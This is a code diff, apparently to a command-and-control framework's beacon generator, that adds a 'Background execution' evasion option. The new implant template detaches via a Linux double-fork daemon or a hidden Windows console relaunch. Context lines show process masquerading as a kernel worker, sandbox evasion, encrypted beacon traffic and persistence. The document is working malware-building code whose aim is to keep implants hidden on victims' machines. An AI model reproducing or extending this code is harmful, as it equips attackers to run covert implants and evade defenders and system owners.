@@ -965,6 +965,10 @@ function renderGenerateView() {
             <input type="checkbox" id="ev-encrypt" checked style="margin-top:2px;accent-color:var(--accent)">
             <div><div style="color:var(--text)">Payload encryption</div><div style="color:var(--text3);font-size:11px">Cifra el body de cada request con XOR+nonce</div></div>
           </label>
+          <label style="display:flex;align-items:flex-start;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="ev-background" checked style="margin-top:2px;accent-color:var(--accent)">
+            <div><div style="color:var(--text)">Background execution</div><div style="color:var(--text3);font-size:11px">Linux: doble-fork daemon · Windows: sin ventana de consola</div></div>
+          </label>
         </div>
       </div>
 
@@ -1458,10 +1462,11 @@ async function generateBeacon() {
   const jitter  = parseInt(document.getElementById('gen-jitter').value) || 20;
   const persist = document.getElementById('gen-persist').checked;
   const ev = {
-    traffic: document.getElementById('ev-traffic').checked,
-    sandbox: document.getElementById('ev-sandbox').checked,
-    masq:    document.getElementById('ev-masq').checked,
-    encrypt: document.getElementById('ev-encrypt').checked,
+    traffic:    document.getElementById('ev-traffic').checked,
+    sandbox:    document.getElementById('ev-sandbox').checked,
+    masq:       document.getElementById('ev-masq').checked,
+    encrypt:    document.getElementById('ev-encrypt').checked,
+    background: document.getElementById('ev-background').checked,
   };
 
   const res = await apiFetch('/api/info/agent-secret');
@@ -1550,6 +1555,41 @@ def _masquerade():
             _ct.CDLL(None).prctl(15, b'[kworker/0:1]', 0, 0, 0)
         except: pass
 _masquerade()
+` : '';
+
+  const bgBlock = ev.background ? `
+def _background():
+    if _WIN:
+        # Re-launch with CREATE_NO_WINDOW if we still have a console window
+        try:
+            import ctypes as _ct
+            if _ct.windll.kernel32.GetConsoleWindow():
+                import subprocess as _sp
+                _sp.Popen(
+                    [sys.executable] + sys.argv,
+                    creationflags=0x08000000,  # CREATE_NO_WINDOW
+                    close_fds=True,
+                )
+                sys.exit(0)
+        except: pass
+    else:
+        # Double-fork daemonize: fully detach from terminal
+        try:
+            if os.fork() > 0: sys.exit(0)   # parent exits
+        except OSError: pass
+        os.setsid()                           # new session, no controlling terminal
+        try:
+            if os.fork() > 0: sys.exit(0)   # intermediate exits
+        except OSError: pass
+        # Redirect stdio to /dev/null
+        try:
+            sys.stdout.flush(); sys.stderr.flush()
+            _dn = open('/dev/null', 'r+')
+            os.dup2(_dn.fileno(), sys.stdin.fileno())
+            os.dup2(_dn.fileno(), sys.stdout.fileno())
+            os.dup2(_dn.fileno(), sys.stderr.fileno())
+        except: pass
+_background()
 ` : '';
 
   const encBlock = ev.encrypt ? `
@@ -1649,7 +1689,7 @@ def _save_cwd(p):
     except Exception:
         pass
 
-_cwd = _load_cwd()${uaBlock}${sandboxBlock}${masqBlock}
+_cwd = _load_cwd()${uaBlock}${sandboxBlock}${bgBlock}${masqBlock}
 ${persist ? `
 def _persist():
     try:
